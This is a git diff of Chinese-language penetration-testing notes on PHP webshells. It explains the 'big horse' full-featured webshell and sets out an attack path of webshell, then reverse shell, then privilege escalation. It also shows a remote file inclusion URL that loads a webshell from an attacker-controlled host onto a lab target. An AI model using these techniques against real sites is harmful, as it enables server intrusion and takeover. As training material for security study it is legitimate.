@@ -30,7 +30,17 @@ echo "<pre>$output</pre>";
 - [popen](https://www.php.net/manual/zh/function.popen.php) - 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。
 - proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。
 `popen`和`proc_open`现在其他 php-shell 中普遍用的较少，可以重点留意一下
-# big-shell.php
+
+# PHP 大马
+何为大马？
+
+大马就是具有较多功能的PHP-webshell（相较于一句话木马），以前我们在拿站的时候，通常在反弹 shell 之前会先上传一个大马，然后利用大马的信息收集、命令执行、文件浏览/上传/编辑等功能，从而反弹一个 shell 回来。（当然，如果能直接反弹 shell 回来，就不用上传大马了）。
+
+但是后来有了菜刀、蚁剑等强大的工具，很多时候只需要一句话木马搭配蚁剑就替代了大马的功能，所以大马就用的少了。
+
+所以我总结了一个大致的利用思路（不用蚁剑的情况下）：`PHP大马`> `反弹shell`>`PE(提权)`
+
+## big-shell.php
 Usage
 RFI:
 - 1. `http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt`，then input the passwd `pass`
